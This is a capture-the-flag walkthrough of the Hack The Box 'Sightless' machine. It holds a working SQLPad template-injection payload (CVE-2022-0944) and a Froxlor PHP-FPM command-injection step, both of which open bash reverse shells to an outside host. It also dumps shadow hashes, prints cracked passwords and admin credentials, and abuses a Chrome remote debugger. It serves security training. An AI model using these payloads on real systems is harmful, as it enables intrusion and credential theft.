---
title: HTB - Sightless
date: 2025-01-12 00:00:00 + 1000
categories: [Linux,Web App,CTF,HTB]
tags: [Docker, WebExploitation, Froxlor, SQLPad, Template Injection]
comments: false
---

The Sightless HTB machine was compromised through a SQLPad RCE vulnerability (CVE-2022-0944), which allowed initial access as root within a docker container. After pivoting to a user account via cracked credentials, the machine was fully rooted by exploiting a Froxlor RCE vulnerability accessed through port forwarding and a Chrome Debugger exploit

## Common Enumeration 
### Nmap

I fired up `nmap` for a full port scan: `sudo nmap -p- -sC -sV -oA recon/allports 10.10.11.32 --open`. As always I throw in the `-sC` for default scripts and `-sV` for version detection

Here's what `nmap` coughed up:

- FTP - `21` - (No anonymous login, bummer)
- SSH - `22`
- HTTP - `80`

```bash
$ sudo nmap -p- -sC -sV -oA recon/allports 10.10.11.32 --open
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-11 10:05 AEDT
Nmap scan report for 10.10.11.32
Host is up (0.014s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings:
|   GenericLines:
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=1/11%Time=6781A7E2%P=aarch64-unknown-linux-g
SF:nu%r(GenericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20F
SF:TP\x20Server\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20comman
SF:d:\x20try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x2
SF:0try\x20being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.54 seconds
```

The HTTP web server was redirecting to `http://sightless.htb/`, so I went ahead and added that to my `/etc/hosts`
### FTP - 21
Okay, so FTP on port 21 was open, but when I tried to log in anonymously, it was a dead end
### Directory Brute Forcing and Fuzzing
#### Gobuster

I used `gobuster` - with a common wordlist to check for hidden directories. The results? - Nothing exciting

```bash
$ gobuster dir -u http://sightless.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -o recon/go.log
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sightless.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 178] [--> http://sightless.htb/images/]
/.                    (Status: 200) [Size: 4993]
/icones               (Status: 301) [Size: 178] [--> http://sightless.htb/icones/]
Progress: 43007 / 43008 (100.00%)
===============================================================
Finished
===============================================================
```

#### Fuzzing

I also tried some fuzzing with `ffuf` Unfortunately, it came up empty

```
$ ffuf -u http://10.10.11.32 -H "Host: FUZZ.sightless.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.32
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.sightless.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 4347 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

### Browsing Website

Navigating to `https://sightless.htb/` led to the following home page noting interesting... 

![img](/assets/img/Sightless/1.webp)

Under the "Our Services" section, the "Start Now" button had a hyperlink to a subdomain: `sqlpad.sightless.htb`. This is why you always need to check for hidden links!

![img](/assets/img/Sightless/2.webp)

I added `sqlpad.sightless.htb` to my `/etc/hosts`
## SQLPad

Navigating to `http://sqlpad.sightless.htb/` brought me to the SQLPad queries page

![img](/assets/img/Sightless/3.webp)

It didn’t seem like there was much I could do here. I checked the "About" section and found that it was running SQLPad version `6.10.0`

![img](/assets/img/Sightless/4.webp)

A quick Google search for "SQLPad 6.10.0 exploit" led me to [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944) which is a template injection vulnerability that could lead to Remote Code Execution (RCE). Jackpot!
### CVE-2022-0944

I found a Proof of Concept (PoC) from [huntr](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb) Here's how I used it

- Click on `Connections`->`Add` connection
- Choose MySQL as the driver
- Input the following payload into the Database form field
- Modified the Payload

```bash
"{{ process.mainModule.require('child_process').exec('/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.54/1337 0>&1\"') }}"
```

I set up a listener using `nc -lvnp 1337` and hit the "Test" button on the SQLPad connection page

```bash
nc -lvnp 1337
```

And just like that, I got a shell as `root` inside a Docker container!

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.54] from (UNKNOWN) [10.10.11.32] 53496
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@c184118df0a6:/var/lib/sqlpad# whoami
whoami
root
root@c184118df0a6:/var/lib/sqlpad#
```
## Initial Access

Alright, so I was in as root but it was inside a Docker container time to do some recon

```bash
root@c184118df0a6:~# ls /
ls /
bin
boot
dev
docker-entrypoint
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
root@c184118df0a6:~#
```

I checked the `/etc/passwd` file to see what users were on the system

```bash
root@c184118df0a6:/home# cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
node:x:1000:1000::/home/node:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
root@c184118df0a6:/home#
```

So, there was `root` and `michael`. As `root` I could read both `/etc/passwd` and `/etc/shadow`

```bash
root@c184118df0a6:/home# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash
```

etc/shadow

```bash
root@c184118df0a6:/home# cat /etc/shadow
cat /etc/shadow
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
daemon:*:19051:0:99999:7:::
bin:*:19051:0:99999:7:::
sys:*:19051:0:99999:7:::
sync:*:19051:0:99999:7:::
games:*:19051:0:99999:7:::
man:*:19051:0:99999:7:::
lp:*:19051:0:99999:7:::
mail:*:19051:0:99999:7:::
news:*:19051:0:99999:7:::
uucp:*:19051:0:99999:7:::
proxy:*:19051:0:99999:7:::
www-data:*:19051:0:99999:7:::
backup:*:19051:0:99999:7:::
list:*:19051:0:99999:7:::
irc:*:19051:0:99999:7:::
gnats:*:19051:0:99999:7:::
nobody:*:19051:0:99999:7:::
_apt:*:19051:0:99999:7:::
node:!:19053:0:99999:7:::
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```

I used `unshadow` to combine the two files into a hash file

```bash
$ unshadow passwd shadow > hash
$ cat hash
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:0:0:root:/root:/bin/bash
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:1001:1001::/home/michael:/bin/bash
```

Then, I used `john` to crack the hashes using the `rockyou.txt` and surprisingly, it cracked both `root` and `michael` passwords

```bash
$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blindside        (root)
insaneclownposse (michael)
2g 0:00:00:51 DONE (2025-01-11 12:50) 0.03903g/s 1144p/s 1918c/s 1918C/s kruimel..galati
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

I tried to SSH into the machine as root with the cracked password, but it didn’t work

```bash
$ ssh root@10.10.11.32
The authenticity of host '10.10.11.32 (10.10.11.32)' can't be established.
ED25519 key fingerprint is SHA256:L+MjNuOUpEDeXYX6Ucy5RCzbINIjBx2qhJQKjYrExig.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.32' (ED25519) to the list of known hosts.
root@10.10.11.32's password:
Permission denied, please try again.
root@10.10.11.32's password:
Permission denied, please try again.
root@10.10.11.32's password:
root@10.10.11.32: Permission denied (publickey,password).
```

## SSH as Michael

So root SSH didn't work, but I had the `michael` password, so I tried that instead. And boom, I was in!

```bash
$ ssh michael@10.10.11.32
michael@10.10.11.32s password:
Last login: Tue Sep  3 11:52:02 2024 from 10.10.14.23
michael@sightless:~$ id
uid=1000(michael) gid=1000(michael) groups=1000(michael)
michael@sightless:~$
```

I tried `su root` with the cracked `root` password but it didn't work either

```bash
michael@sightless:~$ su root
Password:
su: Authentication failure
michael@sightless:~$
```

I grabbed the `user.txt`

```text
9348afe...
```

## Privilege Escalation

I ran `netstat -tnlp` to see what was running on the system

```bash
michael@sightless:~$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:39559         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:43399         0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:47457         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

I found that Froxlor was running on `127.0.0.1:8080`. I tried to curl the port

```bash
curl 127.0.0.1:8080
```

### Port forwarding - (8080)

To access Froxlor, I set up port forwarding using SSH. This command forwards my local port 8080 to the remote host’s localhost:8080

```bash
ssh -fN -L 8080:127.0.0.1:8080 michael@sightless.htb
```

With the port forward in place, I browsed `127.0.0.1:8080` on my machine and saw the Froxlor login page

![img](/assets/img/Sightless/5.webp)

I didn’t have any credentials, so I went back to enumeration. Looking at the running processes again, I noticed a user `john` running `chromedriver` on port `47457`

```bash
michael@sightless:~$ ps -aux | grep john | tee
john        1206  0.0  0.0   2892   940 ?        Ss   Jan10   0:00 /bin/sh -c sleep 140 && /home/john/automation/healthcheck.sh
john        1207  0.0  0.0   2892   964 ?        Ss   Jan10   0:00 /bin/sh -c sleep 110 && /usr/bin/python3 /home/john/automation/administration.py
john        1597  0.0  0.6  33660 24564 ?        S    Jan10   0:32 /usr/bin/python3 /home/john/automation/administration.py
john        1598  0.3  0.3 33630172 14928 ?      Sl   Jan10   3:40 /home/john/automation/chromedriver --port=47457
john        1603  0.0  0.0      0     0 ?        Z    Jan10   0:00 [chromedriver] <defunct>
...snip...
```
### Port forwarding - (47457, 39559, 43399)

Again, I set up port forwarding using SSH

```bash
ssh -fN -L 47457:127.0.0.1:47457 michael@sightless.htb
```

After some more Googling, I found a great guide about [Chrome Remote Debugger Pentesting](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/) I followed the steps in the guide and opened `chrome://inspect/#devices` in Google Chrome on my local machine

![img](/assets/img/Sightless/6.webp)

I also did the same for `43399` and that gave me another set of URLs

![img](/assets/img/Sightless/7.webp)

On `index.php`, I found the admin credentials as part of the payload!

![img](/assets/img/Sightless/8.webp)

```text
loginname: admin
password: ForlorfroxAdmin
```
## Privilege Escalation
### Login to Froxlor as Admin

With the credentials `admin:ForlorfroxAdmin`, I went back to the Froxlor login page, and I was in!

![img](/assets/img/Sightless/9.webp)

I poked around the dashboard but didn't see anything right away. So, I did some more Googling and found a blog post about [Froxlor Authenticated RCE](https://sarperavci.com/Froxlor-Authenticated-RCE/) and I followed the steps in the blog post

First, I created a bash script to get a reverse shell:

```bash
echo "bash -i >& /dev/tcp/10.10.14.54/1337 0>&1" > rce.sh
chmod +x rce.sh
```

Then, I navigated to `PHP` -> `PHP-FPM versions` and clicked on "Create new PHP version". (rather then modifying the existing one)

![img](/assets/img/Sightless/10.webp)

I added the following
	- Short description: `RCE`
	- php-fpm restart command: `/bin/bash /dev/shm/rce.sh`
	- Clicked `Save`

![img](/assets/img/Sightless/11.webp)

I set up a listener on my machine:

```bash
nc -lvnp 1337
```

After waiting for a bit, I finally got a root shell!

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.54] from (UNKNOWN) [10.10.11.32] 32832
bash: cannot set terminal process group (34864): Inappropriate ioctl for device
bash: no job control in this shell
root@sightless:~# whoami
whoami
root
root@sightless:~#
```

root.txt

```text
87e3fe8cf...
```

